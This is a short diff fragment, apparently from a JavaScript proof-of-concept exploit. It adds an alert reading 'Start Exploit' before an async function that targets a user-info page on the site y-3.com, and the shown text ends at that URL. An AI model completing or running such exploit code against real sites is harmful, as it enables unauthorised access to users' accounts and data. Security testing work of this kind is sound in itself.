@@ -1,3 +1,4 @@
+alert("Start Exploit");
 (async () => {
   const url = "https://y-3.com/mypage/user_info_complete.html";
 
